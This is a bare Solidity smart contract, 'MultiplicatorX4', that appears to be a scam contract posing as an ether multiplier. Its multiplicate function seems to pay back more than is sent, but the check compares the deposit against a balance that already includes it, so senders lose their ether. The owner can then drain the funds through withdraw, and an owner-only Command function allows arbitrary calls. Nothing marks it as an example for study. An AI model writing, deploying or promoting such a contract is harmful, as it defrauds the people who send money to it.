pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public Owner = msg.sender;

    function() public payable {}

    function withdraw() payable public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr, bytes data) payable public {
        require(msg.sender == Owner);
        adr.call.value(msg.value)(data);
    }
    
    function multiplicate(address adr) public payable {
        checkAndTransfer(adr, msg.value);
    }
    
    function checkAndTransfer(address adr, uint256 value) internal {
        if (value >= this.balance) {
            adr.transfer(this.balance + value);
        }
    }
}